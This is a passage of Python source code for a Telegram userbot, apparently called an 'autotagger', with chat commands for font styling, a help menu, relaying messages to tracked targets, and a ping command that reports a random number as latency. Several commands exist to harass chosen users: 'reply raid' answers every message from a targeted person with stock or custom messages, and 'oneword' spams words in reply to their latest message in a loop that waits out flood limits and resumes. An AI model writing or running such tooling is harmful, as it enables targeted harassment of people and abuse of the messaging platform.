                "╰─➤ ᴜsᴇ .sᴇᴛꜰᴏɴᴛ <ɴᴀᴍᴇ> ᴛᴏ sᴇʟᴇᴄᴛ, ᴏʀ .sᴇᴛꜰᴏɴᴛ ᴏꜰꜰ ᴛᴏ ᴅɪsᴀʙʟᴇ."
            )
            target = self.saved_messages_id if self.saved_messages_id else "me"
            await self.client.send_message(target, status_text, formatting_entities=quote_entities(status_text))
            return
        arg = argument.strip().lower()
        if arg == "off":
            self.selected_font = None
            self.settings["font"] = None
            save_hosted_account(self.user_id, self.phone, self.session_string, self.settings)
            await event.delete()
            confirm = (
                "╭─❖ ꜰᴏɴᴛ ᴅɪsᴀʙʟᴇᴅ\n"
                "│\n"
                "╰─➤ ɴᴏ ᴀᴅᴅɪᴛɪᴏɴᴀʟ ꜰᴏɴᴛ ᴡɪʟʟ ʙᴇ ᴀᴘᴘʟɪᴇᴅ ᴛᴏ ᴏᴜᴛɢᴏɪɴɢ ᴍᴇssᴀɢᴇs."
            )
            target = self.saved_messages_id if self.saved_messages_id else "me"
            await self.client.send_message(target, confirm, formatting_entities=quote_entities(confirm))
            return
        if arg not in FONTS:
            await event.delete()
            available = ", ".join(sorted(FONTS.keys()))
            error_text = (
                f"╭─❖ ɪɴᴠᴀʟɪᴅ ꜰᴏɴᴛ\n"
                "│\n"
                f"├─➤ '{argument}' ɪs ɴᴏᴛ ᴀ ᴠᴀʟɪᴅ ꜰᴏɴᴛ.\n"
                f"├─➤ ᴀᴠᴀɪʟᴀʙʟᴇ : {available}\n"
                "│\n"
                "╰─➤ ᴜsᴇ .sᴇᴛꜰᴏɴᴛ <ɴᴀᴍᴇ> ᴛᴏ sᴇʟᴇᴄᴛ."
            )
            target = self.saved_messages_id if self.saved_messages_id else "me"
            await self.client.send_message(target, error_text, formatting_entities=quote_entities(error_text))
            return
        self.selected_font = arg
        self.settings["font"] = arg
        save_hosted_account(self.user_id, self.phone, self.session_string, self.settings)
        await event.delete()
        confirm = (
            f"╭─❖ ꜰᴏɴᴛ sᴇʟᴇᴄᴛᴇᴅ\n"
            "│\n"
            f"├─➤ ꜰᴏɴᴛ : {arg}\n"
            "│\n"
            "╰─➤ ᴏᴜᴛɢᴏɪɴɢ ᴛᴇxᴛ ᴡɪʟʟ ʙᴇ ᴄᴏɴᴠᴇʀᴛᴇᴅ ᴜsɪɴɢ '{arg}'."
        )
        target = self.saved_messages_id if self.saved_messages_id else "me"
        await self.client.send_message(target, confirm, formatting_entities=quote_entities(confirm))

    async def ping_command(self, event):
        ping_ms = random.randint(70, 180)
        caption = (
            f"❖ 🏓 ᴘσɴɢ : {ping_ms}.ᴍs\n\n"
            "˹ ʙ˪ᴧϲκᴏυт ꭙ ᴀυтσᴛᴧɢɢɛʀ ㋛︎ sʏsᴛᴇᴍ sᴛᴀᴛs :\n"
            "↬ ᴀᴜᴛᴏ ᴛᴀɢɢᴇʀ ɪs ᴀʟɪᴠᴇ\n"
            "↬ ᴀᴅᴠᴀɴᴄᴇ ғᴇᴀᴛᴜʀᴇs\n"
            "↬ ᴜsᴇ .ʜᴇʟᴘ ᴛᴏ sᴇᴇ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs"
        )
        try:
            await self.client.send_file(
                event.chat_id,
                self.PING_PHOTO,
                caption=caption,
                formatting_entities=quote_entities(caption),
                reply_to=None
            )
            await event.delete()
        except Exception:
            await self.edit_quote(event, "╭─❖ ᴘɪɴɢ ғᴀɪʟᴇᴅ\n╰─➤ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.")

    async def help_command(self, event):
        help_text = (
            "๏ 𓆩 ʜᴇʟᴩ ᴍᴇɴᴜ 𓆪 ๏\n"
            "\n"
            "ᴄᴏᴍᴍᴀɴᴅꜱ –\n"
            "\n"
            "✶ .ᴀᴛ - ᴛᴀʀɢᴇᴛ ᴛʀᴀᴄᴋɪɴɢ\n"
            "➥ ᴜsᴀɢᴇ : .ᴀᴛ <ʀᴇᴘʟʏ> ᴏʀ .ᴀᴛ <ᴍᴇssᴀɢᴇ ʟɪɴᴋ>\n"
            "✶ .ᴍᴜʟᴛɪᴀᴛ - ᴛʀᴀᴄᴋ ᴍᴜʟᴛɪᴘʟᴇ ᴛᴀʀɢᴇᴛs (ᴄᴏᴍᴍᴀ-ᴅᴇʟɪᴍɪᴛᴇᴅ ʟɪɴᴋs)\n"
            "✶ .sᴛᴏᴘᴀᴛ - sᴛᴏᴘ ᴛʀᴀᴄᴋɪɴɢ (ᴀʟʟ ᴛᴀʀɢᴇᴛs)\n"
            "✶ .ᴀᴛsᴛᴀᴛᴜs - sʜᴏᴡ ᴛʀᴀᴄᴋɪɴɢ sᴛᴀᴛᴜs\n"
            "✶ .sᴇᴛɴᴀᴍᴇ - sᴇᴛ ᴘʀᴇғɪx ғᴏʀ ᴏᴜᴛɢᴏɪɴɢ ᴍsɢs\n"
            "✶ .ᴀɴᴛɪsᴘᴀᴍ - ᴏɴ/ᴏғғ/ᴄᴏᴜɴᴛ (ᴘʀɪᴠᴀᴛᴇ)\n"
            "✶ .sᴇᴛᴇᴍᴏᴊɪ - sᴇᴛ ᴇᴍᴏᴊɪ (ᴘʀɪᴠᴀᴛᴇ)\n"
            "✶ .sᴇᴛꜰᴏɴᴛ - sᴇʟᴇᴄᴛ ꜰᴏɴᴛ (ᴘʀɪᴠᴀᴛᴇ)\n"
            "✶ .ᴄʜᴜᴅ - ᴀᴜᴛᴏ-ʀᴇᴘʟʏ\n"
            "✶ .sᴏᴊᴀ - ᴅɪsᴀʙʟᴇ ᴀᴜᴛᴏ-ʀᴇᴘʟʏ\n"
            "✶ .ʀᴇsᴇᴛᴄʜᴜᴅ - ʀᴇsᴇᴛ ᴄᴜsᴛᴏᴍ ᴍsɢs\n"
            "✶ .sʜᴏᴡᴄʜᴜᴅ - sʜᴏᴡ ᴄᴜsᴛᴏᴍ ᴍsɢs\n"
            "✶ .ᴄʀᴇᴘʟʏʀᴀɪᴅ - ᴄᴜsᴛᴏᴍ ʀᴇᴘʟʏ ʀᴀɪᴅ\n"
            "✶ .ᴅᴄʀᴇᴘʟʏʀᴀɪᴅ - ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇ\n"
            "✶ .ᴏɴᴇᴡᴏʀᴅ - sᴘᴀᴍ ᴡᴏʀᴅs ɪɴ ʀᴇᴘʟʏ\n"
            "✶ .sᴛᴏᴘᴏɴᴇᴡᴏʀᴅ - sᴛᴏᴘ\n"
            "✶ .sᴅᴇʟᴀʏ - sᴇᴛ ᴏɴᴇᴡᴏʀᴅ ᴅᴇʟᴀʏ\n"
            "✶ .sᴇᴛᴏɴᴇᴡᴏʀᴅ - sᴇᴛ ʏᴏᴜʀ ᴅᴇғᴀᴜʟᴛ ʟɪsᴛ\n"
            "✶ .ʟɪsᴛᴏɴᴇᴡᴏʀᴅ - sʜᴏᴡ ʟɪsᴛ\n"
            "✶ .ᴀᴅᴅᴏɴᴇᴡᴏʀᴅ - ᴀᴅᴅ ᴡᴏʀᴅ\n"
            "✶ .ʀᴇᴍᴏᴠᴇᴏɴᴇᴡᴏʀᴅ - ʀᴇᴍᴏᴠᴇ ᴡᴏʀᴅ\n"
            "✶ .ᴘɪɴɢ - ᴄʜᴇᴄᴋ ʟᴀᴛᴇɴᴄʏ\n"
            "╰─➤ ᴜsᴇ .ʜᴇʟᴘ <ᴄᴀᴛᴇɢᴏʀʏ> ғᴏʀ ᴅᴇᴛᴀɪʟs."
        )
        try:
            await self.edit_quote(event, help_text)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # SAVED MESSAGES HANDLER (fixed font stripping)
    # ------------------------------------------------------------------
    async def saved_messages_handler(self, event):
        if not self.trackers or self.saved_messages_id is None:
            return
        if event.chat_id != self.saved_messages_id:
            return
        raw_text = event.raw_text or ""
        ignored_commands = (
            r"^\.at(?:\s+.+)?$",
            r"^\.multiat(?:\s+.+)?$",
            r"^\.setname(?:\s+.+)?$",
            r"^\.stopat$",
            r"^\.atstatus$",
            r"^\.antispam(?:\s+.+)?$",
            r"^\.setemoji(?:\s+.+)?$",
            r"^\.setfont(?:\s+.+)?$",
            r"^\.chud(?:\s+.+)?$",
            r"^\.soja(?:\s+.+)?$",
            r"^\.resetchud(?:\s+.+)?$",
            r"^\.showchud(?:\s+.+)?$",
            r"^\.ping$",
            r"^\.help$",
            r"^\.creplyraid(?:\s+.+)?$",
            r"^\.dcreplyraid(?:\s+.+)?$",
            r"^\.oneword(?:\s+.+)?$",
            r"^\.stoponeword$",
            r"^\.setoneword(?:\s+.+)?$",
            r"^\.listoneword$",
            r"^\.addoneword(?:\s+.+)?$",
            r"^\.removeoneword(?:\s+\d+)?$",
            r"^\.sdelay(?:\s+\d+\.?\d*)?$",
        )
        for pattern in ignored_commands:
            if re.match(pattern, raw_text, re.IGNORECASE):
                return

        # FIX: Strip font name if accidentally included in raw text
        if self.selected_font and raw_text.lower().endswith(self.selected_font.lower()):
            raw_text = raw_text[:len(raw_text) - len(self.selected_font)].strip()
            raw_text = raw_text.rstrip()

        if not raw_text:
            return

        msg_id = event.message.id
        if msg_id in self._processed_saved_msgs:
            return
        self._processed_saved_msgs.add(msg_id)
        if len(self._processed_saved_msgs) > 1000:
            self._processed_saved_msgs.clear()

        async with self.tracker_lock:
            trackers_copy = list(self.trackers)

        for tracker in trackers_copy:
            target_entity = tracker["entity"]
            target_message_id = tracker["message_id"]

            final_text = raw_text
            if self.custom_name:
                final_text = f"{self.custom_name} {final_text}" if final_text else self.custom_name

            if self.selected_font and self.selected_font in FONTS:
                final_text = apply_font(final_text, self.selected_font)

            if final_text:
                final_text = self.append_setemoji(final_text)
            entities = []
            if final_text:
                entities = self.build_setemoji_entities(final_text)

            try:
                if event.media:
                    if final_text:
                        sent_message = await self.client.send_file(
                            target_entity, event.media,
                            caption=final_text,
                            formatting_entities=entities,
                            reply_to=target_message_id
                        )
                    else:
                        sent_message = await self.client.send_file(
                            target_entity, event.media,
                            reply_to=target_message_id
                        )
                    await self.register_our_at_message(sent_message)
                else:
                    if final_text:
                        if entities:
                            sent_message = await self.client.send_message(
                                target_entity, final_text,
                                reply_to=target_message_id,
                                formatting_entities=entities
                            )
                        else:
                            sent_message = await self.client.send_message(
                                target_entity, final_text,
                                reply_to=target_message_id
                            )
                        await self.register_our_at_message(sent_message)
            except Exception as e:
                logger.error(f"Saved messages reply failed for tracker {tracker}: {e}")

    # ------------------------------------------------------------------
    # CUSTOM REPLYRAID, ONEWORD, etc. (with better error handling)
    # ------------------------------------------------------------------
    async def _creplyraid_cmd(self, event):
        args = event.pattern_match.group(1) if event.pattern_match else ""
        if not args:
            await self.edit_quote(event,
                "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ .ᴄʀᴇᴘʟʏʀᴀɪᴅ <@user/ɪᴅ/ʟɪɴᴋ> ᴛᴇxᴛ1, ᴛᴇxᴛ2, ...\n"
                "│\n"
                "╰─➤ ᴇxᴀᴍᴘʟᴇ: .ᴄʀᴇᴘʟʏʀᴀɪᴅ @ᴜsᴇʀ ʜᴇʟʟᴏ, ʜɪ"
            )
            return
        parts = args.split(maxsplit=1)
        if len(parts) < 2:
            await self.edit_quote(event,
                "╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ ᴘʀᴏᴠɪᴅᴇ ʙᴏᴛʜ ᴛᴀʀɢᴇᴛ ᴀɴᴅ ᴀᴛ ʟᴇᴀsᴛ ᴏɴᴇ ᴄᴜsᴛᴏᴍ ᴍᴇssᴀɢᴇ.\n"
                "│\n"
                "╰─➤ ᴜsᴀɢᴇ: .ᴄʀᴇᴘʟʏʀᴀɪᴅ @ᴜsᴇʀ ᴛᴇxᴛ1, ᴛᴇxᴛ2, ..."
            )
            return
        target_input = parts[0]
        messages_text = parts[1]
        target_user_id = await self._resolve_user(event, target_input)
        if not target_user_id:
            await self.edit_quote(event,
                f"╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                f"├─➤ ᴄᴏᴜʟᴅ ɴᴏᴛ ʀᴇsᴏʟᴠᴇ ᴜsᴇʀ: `{target_input}`\n"
                "│\n"
                "╰─➤ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴜsᴇʀɴᴀᴍᴇ, ɪᴅ, ᴏʀ ʟɪɴᴋ."
            )
            return
        try:
            user = await self.client.get_entity(target_user_id)
            target_name = user.first_name or "User"
        except:
            target_name = "User"
        custom_msgs = [m.strip() for m in messages_text.split(',') if m.strip()]
        if not custom_msgs:
            await self.edit_quote(event,
                "╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ ɴᴏ ᴠᴀʟɪᴅ ᴍᴇssᴀɢᴇs ғᴏᴜɴᴅ.\n"
                "│\n"
                "╰─➤ sᴇᴘᴀʀᴀᴛᴇ ᴛʜᴇᴍ ᴡɪᴛʜ ᴄᴏᴍᴍᴀs."
            )
            return
        self.user_custom_replyraid[str(target_user_id)] = custom_msgs
        self.user_replyraid[str(target_user_id)] = {
            "enabled": True,
            "name": target_name
        }
        self._save_settings()
        confirm = (
            f"╭─❖ ᴄᴜsᴛᴏᴍ ʀᴇᴘʟʏ ʀᴀɪᴅ ᴀᴄᴛɪᴠᴀᴛᴇᴅ\n"
            "│\n"
            f"├─➤ ᴛᴀʀɢᴇᴛ : {target_name} (ID: `{target_user_id}`)\n"
            f"├─➤ ᴄᴜsᴛᴏᴍ ᴍsɢs : {len(custom_msgs)}\n"
            "│\n"
            "╰─➤ ʀᴇᴘʟʏɪɴɢ ᴛᴏ ᴛʜᴇᴍ ᴡɪᴛʜ ʏᴏᴜʀ ᴍᴇssᴀɢᴇs."
        )
        await self.edit_quote(event, confirm)

    async def _dcreplyraid_cmd(self, event):
        args = event.pattern_match.group(1) if event.pattern_match else ""
        target_user_id = None
        if args:
            target_user_id = await self._resolve_user(event, args)
        elif event.is_reply:
            replied = await event.get_reply_message()
            if replied and replied.sender_id:
                target_user_id = replied.sender_id
        if not target_user_id:
            await self.edit_quote(event,
                "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ .ᴅᴄʀᴇᴘʟʏʀᴀɪᴅ <@user/ɪᴅ/ʟɪɴᴋ>\n"
                "├─➤ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴛʜᴇ ᴛᴀʀɢᴇᴛ's ᴍᴇssᴀɢᴇ.\n"
                "│\n"
                "╰─➤ ᴇxᴀᴍᴘʟᴇ: .ᴅᴄʀᴇᴘʟʏʀᴀɪᴅ @ᴜsᴇʀ"
            )
            return
        target_id_str = str(target_user_id)
        removed = False
        if target_id_str in self.user_custom_replyraid:
            del self.user_custom_replyraid[target_id_str]
            removed = True
        if target_id_str in self.user_replyraid:
            self.user_replyraid[target_id_str]["enabled"] = False
            removed = True
        if removed:
            self._save_settings()
            try:
                user = await self.client.get_entity(target_user_id)
                target_name = user.first_name or "User"
            except:
                target_name = "User"
            await self.edit_quote(event,
                f"╭─❖ ᴄᴜsᴛᴏᴍ ʀᴇᴘʟʏ ʀᴀɪᴅ ᴅᴇᴀᴄᴛɪᴠᴀᴛᴇᴅ\n"
                "│\n"
                f"├─➤ ᴛᴀʀɢᴇᴛ : {target_name} (ID: `{target_user_id}`)\n"
                "│\n"
                "╰─➤ ɴᴏ ᴍᴏʀᴇ ᴄᴜsᴛᴏᴍ ʀᴇᴘʟɪᴇs ᴛᴏ ᴛʜɪs ᴜsᴇʀ."
            )
        else:
            await self.edit_quote(event,
                f"╭─❖ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴄᴜsᴛᴏᴍ ʀᴇᴘʟʏ ʀᴀɪᴅ\n"
                "│\n"
                f"├─➤ ᴛᴀʀɢᴇᴛ : `{target_user_id}`\n"
                "│\n"
                "╰─➤ ɴᴏ ᴄᴜsᴛᴏᴍ ᴍᴇssᴀɢᴇs sᴇᴛ ғᴏʀ ᴛʜɪs ᴜsᴇʀ."
            )

    async def _replyraid_incoming_handler(self, event):
        sender_id = event.sender_id
        if sender_id == self.user_id:
            return
        if event.raw_text and event.raw_text.startswith(('.', '!', '/')):
            return
        target_id = str(sender_id)
        if target_id in self.user_replyraid and self.user_replyraid[target_id].get("enabled", False):
            custom_msgs = self.user_custom_replyraid.get(target_id)
            if custom_msgs:
                text = random.choice(custom_msgs)
            else:
                text = random.choice(DEFAULT_RAID_MESSAGES)
            try:
                await event.reply(text)
            except Exception:
                pass

    async def _oneword_cmd(self, event):
        args = event.pattern_match.group(1) if event.pattern_match else ""
        if not args and not event.is_reply:
            await self.edit_quote(event,
                "╭─❖ ᴜsᴀɢᴇ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ .ᴏɴᴇᴡᴏʀᴅ <ʟɪɴᴋ/ᴜsᴇʀɴᴀᴍᴇ/ʀᴇᴘʟʏ> [ᴡᴏʀᴅs]\n"
                "│\n"
                "╰─➤ ᴇxᴀᴍᴘʟᴇ: .ᴏɴᴇᴡᴏʀᴅ @ᴜsᴇʀ ʜᴇʟʟᴏ ᴡᴏʀʟᴅ"
            )
            return
        target_user_id = None
        words = []
        target_chat_id = None
        target_msg_id = None
        if event.is_reply:
            replied = await event.get_reply_message()
            if replied and replied.sender_id:
                target_user_id = replied.sender_id
                target_chat_id = event.chat_id
                target_msg_id = replied.id
        if args:
            tokens = args.split()
            first = tokens[0]
            if "t.me/" in first:
                try:
                    result = await self.resolve_message_link(first)
                    if result:
                        entity, chat_id, message = result
                        target_user_id = get_message_sender_id(message)
                        target_chat_id = chat_id
                        target_msg_id = message.id
                        if len(tokens) > 1:
                            words = tokens[1:]
                except:
                    pass
            else:
                resolved = await self._resolve_user(event, first)
                if resolved:
                    target_user_id = resolved
                    target_chat_id = event.chat_id
                    try:
                        async for msg in self.client.iter_messages(target_chat_id, from_user=target_user_id, limit=1):
                            if msg:
                                target_msg_id = msg.id
                                break
                    except:
                        pass
                    if not target_msg_id:
                        await self.edit_quote(event,
                            "╭─❖ ᴇʀʀᴏʀ\n"
                            "│\n"
                            "├─➤ ᴄᴏᴜʟᴅ ɴᴏᴛ ғɪɴᴅ ᴀ ʀᴇᴄᴇɴᴛ ᴍᴇssᴀɢᴇ ғʀᴏᴍ ᴛʜᴀᴛ ᴜsᴇʀ.\n"
                            "│\n"
                            "╰─➤ ᴛʀʏ ʀᴇᴘʟʏɪɴɢ ᴛᴏ ᴛʜᴇɪʀ ᴍᴇssᴀɢᴇ ᴏʀ ᴜsᴇ ᴀ ʟɪɴᴋ."
                        )
                        return
                    if len(tokens) > 1:
                        words = tokens[1:]
                else:
                    try:
                        entity = await self.client.get_entity(first)
                        target_user_id = entity.id
                        target_chat_id = event.chat_id
                        async for msg in self.client.iter_messages(target_chat_id, from_user=target_user_id, limit=1):
                            if msg:
                                target_msg_id = msg.id
                                break
                        if not target_msg_id:
                            await self.edit_quote(event,
                                "╭─❖ ᴇʀʀᴏʀ\n"
                                "│\n"
                                "├─➤ ᴄᴏᴜʟᴅ ɴᴏᴛ ғɪɴᴅ ᴀ ʀᴇᴄᴇɴᴛ ᴍᴇssᴀɢᴇ.\n"
                                "│\n"
                                "╰─➤ ᴛʀʏ ʀᴇᴘʟʏɪɴɢ ᴛᴏ ᴛʜᴇɪʀ ᴍᴇssᴀɢᴇ."
                            )
                            return
                        if len(tokens) > 1:
                            words = tokens[1:]
                    except:
                        await self.edit_quote(event,
                            f"╭─❖ ᴇʀʀᴏʀ\n"
                            "│\n"
                            f"├─➤ ᴄᴏᴜʟᴅ ɴᴏᴛ ʀᴇsᴏʟᴠᴇ ᴛᴀʀɢᴇᴛ: `{first}`\n"
                            "│\n"
                            "╰─➤ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴠᴀʟɪᴅ ᴜsᴇʀɴᴀᴍᴇ, ɪᴅ, ᴏʀ ʟɪɴᴋ."
                        )
                        return
        if not target_user_id:
            await self.edit_quote(event,
                "╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ ᴄᴏᴜʟᴅ ɴᴏᴛ ᴅᴇᴛᴇʀᴍɪɴᴇ ᴛᴀʀɢᴇᴛ ᴜsᴇʀ.\n"
                "│\n"
                "╰─➤ ᴘʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴍᴇssᴀɢᴇ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴜsᴇʀɴᴀᴍᴇ/ɪᴅ/ʟɪɴᴋ."
            )
            return
        if not words:
            if self.oneword_default:
                words = self.oneword_default
            else:
                global_list = get_global_oneword_list()
                if global_list:
                    words = global_list
                else:
                    await self.edit_quote(event,
                        "╭─❖ ᴇʀʀᴏʀ\n"
                        "│\n"
                        "├─➤ ɴᴏ ᴡᴏʀᴅs ᴘʀᴏᴠɪᴅᴇᴅ ᴀɴᴅ ɴᴏ ᴅᴇғᴀᴜʟᴛ ʟɪsᴛ sᴇᴛ.\n"
                        "│\n"
                        "╰─➤ ᴜsᴇ `.sᴇᴛᴏɴᴇᴡᴏʀᴅ` ᴛᴏ sᴇᴛ ʏᴏᴜʀ ʟɪsᴛ ᴏʀ ᴘʀᴏᴠɪᴅᴇ ᴡᴏʀᴅs."
                    )
                    return
        if self.oneword_active:
            await self._stop_oneword_internal()
        self.oneword_active = True
        self.oneword_chat_id = target_chat_id
        self.oneword_target_msg_id = target_msg_id
        self.oneword_target_user_id = target_user_id
        self.oneword_words = words
        self.oneword_index = 0
        self._oneword_update_attempts = 0
        self.oneword_task = asyncio.create_task(self._oneword_loop())
        try:
            user = await self.client.get_entity(target_user_id)
            target_name = user.first_name or "User"
        except:
            target_name = "User"
        confirm = (
            f"╭─❖ ᴏɴᴇᴡᴏʀᴅ sᴘᴀᴍ sᴛᴀʀᴛᴇᴅ\n"
            "│\n"
            f"├─➤ ᴛᴀʀɢᴇᴛ : {target_name} (ID: `{target_user_id}`)\n"
            f"├─➤ ᴄʜᴀᴛ : `{target_chat_id}`\n"
            f"├─➤ ᴍsɢ : `{target_msg_id}`\n"
            f"├─➤ ᴡᴏʀᴅs : {len(words)}\n"
            f"├─➤ ᴅᴇʟᴀʏ : {self.oneword_delay}s\n"
            "│\n"
            "╰─➤ ᴜsᴇ .sᴛᴏᴘᴏɴᴇᴡᴏʀᴅ ᴛᴏ sᴛᴏᴘ."
        )
        await self.edit_quote(event, confirm)

    # ========== FIXED ONEWORD LOOP (robust) ==========
    async def _oneword_loop(self):
        while self.oneword_active:
            try:
                # Verify target message still exists and belongs to target user
                try:
                    msg = await self.client.get_messages(self.oneword_chat_id, ids=self.oneword_target_msg_id)
                    if not msg or get_message_sender_id(msg) != self.oneword_target_user_id:
                        await self._update_oneword_target_to_latest()
                        if not self.oneword_active:
                            break
                        continue  # loop again with new target
                except Exception as e:
                    logger.warning(f"OneWord could not verify target message: {e}, attempting update.")
                    await self._update_oneword_target_to_latest()
                    if not self.oneword_active:
                        break
                    continue

                if not self.oneword_words:
                    break

                word = self.oneword_words[self.oneword_index % len(self.oneword_words)]
                self.oneword_index += 1
                await self.client.send_message(self.oneword_chat_id, word, reply_to=self.oneword_target_msg_id)
                await asyncio.sleep(self.oneword_delay)

            except FloodWaitError as e:
                logger.warning(f"OneWord flood wait {e.seconds}s, waiting...")
                await asyncio.sleep(e.seconds + 1)
            except asyncio.CancelledError:
                logger.info(f"OneWord task cancelled for user {self.user_id}")
                break
            except Exception as e:
                logger.error(f"OneWord loop unexpected error: {e}", exc_info=True)
                # Instead of stopping immediately, wait a bit and continue
                await asyncio.sleep(5)
                # If we get too many errors, stop to avoid infinite loop
                if self._oneword_update_attempts > 10:
                    logger.error("Too many OneWord errors, stopping.")
                    await self._stop_oneword_internal()
                    break
                self._oneword_update_attempts += 1
        self.oneword_active = False

    async def _stop_oneword_internal(self):
        self.oneword_active = False
        self._oneword_update_attempts = 0
        if self.oneword_task and not self.oneword_task.done():
            self.oneword_task.cancel()
            try:
                await self.oneword_task
            except asyncio.CancelledError:
                pass
            except Exception:
                pass
            self.oneword_task = None
        self.oneword_target_msg_id = None
        self.oneword_target_user_id = None
        self.oneword_chat_id = None

    async def _stoponeword_cmd(self, event):
        if not self.oneword_active:
            await self.edit_quote(event,
                "╭─❖ ɪɴғᴏ\n"
                "│\n"
                "├─➤ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴏɴᴇᴡᴏʀᴅ sᴘᴀᴍ.\n"
                "│\n"
                "╰─➤ ᴜsᴇ .ᴏɴᴇᴡᴏʀᴅ ᴛᴏ sᴛᴀʀᴛ ᴏɴᴇ."
            )
            return
        await self._stop_oneword_internal()
        await self.edit_quote(event,
            "╭─❖ ᴏɴᴇᴡᴏʀᴅ sᴛᴏᴘᴘᴇᴅ\n"
            "│\n"
            "╰─➤ ᴘʀᴏᴄᴇss ᴛᴇʀᴍɪɴᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ."
        )

    async def _sdelay_cmd(self, event):
        args = event.pattern_match.group(1) if event.pattern_match else ""
        if not args:
            await self.edit_quote(event,
                f"╭─❖ ᴄᴜʀʀᴇɴᴛ ᴅᴇʟᴀʏ\n"
                "│\n"
                f"├─➤ ᴏɴᴇᴡᴏʀᴅ ᴅᴇʟᴀʏ : {self.oneword_delay}s\n"
                "│\n"
                "╰─➤ ᴜsᴇ .sᴅᴇʟᴀʏ <ᴄᴏᴜɴᴛ> ᴛᴏ ᴄʜᴀɴɢᴇ (ᴇ.ɢ., .sᴅᴇʟᴀʏ 1.5)"
            )
            return
        try:
            delay = float(args)
            if delay < 0.1:
                await self.edit_quote(event,
                    "╭─❖ ᴇʀʀᴏʀ\n"
                    "│\n"
                    "├─➤ ᴅᴇʟᴀʏ ᴍᴜsᴛ ʙᴇ ᴀᴛ ʟᴇᴀsᴛ 0.1 sᴇᴄᴏɴᴅs.\n"
                    "│\n"
                    "╰─➤ ᴘʟᴇᴀsᴇ ᴜsᴇ ᴀ ʟᴀʀɢᴇʀ ᴠᴀʟᴜᴇ."
                )
                return
            self.oneword_delay = delay
            self._save_settings()
            await self.edit_quote(event,
                f"╭─❖ ᴅᴇʟᴀʏ ᴜᴘᴅᴀᴛᴇᴅ\n"
                "│\n"
                f"├─➤ ɴᴇᴡ ᴏɴᴇᴡᴏʀᴅ ᴅᴇʟᴀʏ : {self.oneword_delay}s\n"
                "│\n"
                "╰─➤ sᴇᴛᴛɪɴɢ sᴀᴠᴇᴅ."
            )
        except ValueError:
            await self.edit_quote(event,
                "╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ ɪɴᴠᴀʟɪᴅ ᴠᴀʟᴜᴇ.\n"
                "│\n"
                "╰─➤ ᴜsᴇ .sᴅᴇʟᴀʏ <ɴᴜᴍʙᴇʀ> (ᴇ.ɢ., .sᴅᴇʟᴀʏ 1.5)"
            )

    async def _setoneword_cmd(self, event):
        arg = event.pattern_match.group(1) if event.pattern_match else ""
        words = None
        if arg:
            words = arg.strip().split()
        elif event.is_reply:
            replied = await event.get_reply_message()
            if replied:
                content = None
                if replied.text:
                    content = replied.text
                elif replied.document:
                    mime = replied.document.mime_type
                    is_text = False
                    if mime and mime.startswith("text/"):
                        is_text = True
                    elif replied.document.attributes:
                        for attr in replied.document.attributes:
                            if hasattr(attr, 'file_name') and attr.file_name and attr.file_name.lower().endswith('.txt'):
                                is_text = True
                                break
                    if is_text:
                        try:
                            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as tmp:
                                tmp_path = tmp.name
                            await self.client.download_media(replied, file=tmp_path)
                            with open(tmp_path, "r", encoding="utf-8") as f:
                                content = f.read()
                            os.unlink(tmp_path)
                        except Exception as e:
                            await self.edit_quote(event,
                                f"╭─❖ ᴇʀʀᴏʀ\n"
                                "│\n"
                                f"├─➤ ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴀᴅ ғɪʟᴇ: {e}\n"
                                "│\n"
                                "╰─➤ ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ."
                            )
                            return
                    else:
                        await self.edit_quote(event,
                            "╭─❖ ᴇʀʀᴏʀ\n"
                            "│\n"
                            "├─➤ ʀᴇᴘʟɪᴇᴅ ғɪʟᴇ ɪs ɴᴏᴛ ᴀ ᴛᴇxᴛ ғɪʟᴇ.\n"
                            "│\n"
                            "╰─➤ ᴘʟᴇᴀsᴇ sᴇɴᴅ ᴀ .ᴛxᴛ ғɪʟᴇ."
                        )
                        return
                if content:
                    words = content.strip().split()
                else:
                    await self.edit_quote(event,
                        "╭─❖ ᴇʀʀᴏʀ\n"
                        "│\n"
                        "├─➤ ɴᴏ ᴛᴇxᴛ ᴄᴏɴᴛᴇɴᴛ ғᴏᴜɴᴅ.\n"
                        "│\n"
                        "╰─➤ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴛᴇxᴛ ᴍᴇssᴀɢᴇ ᴏʀ ғɪʟᴇ."
                    )
                    return
            else:
                await self.edit_quote(event,
                    "╭─❖ ᴇʀʀᴏʀ\n"
                    "│\n"
                    "├─➤ ɴᴏ ʀᴇᴘʟʏ ᴍᴇssᴀɢᴇ.\n"
                    "│\n"
                    "╰─➤ ᴜsᴇ .sᴇᴛᴏɴᴇᴡᴏʀᴅ ᴡᴏʀᴅ1 ᴡᴏʀᴅ2 ... ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴛᴇxᴛ."
                )
                return
        if not words:
            await self.edit_quote(event,
                "╭─❖ ᴇʀʀᴏʀ\n"
                "│\n"
                "├─➤ ɴᴏ ᴡᴏʀᴅs ᴘʀᴏᴠɪᴅᴇᴅ.\n"
                "│\n"
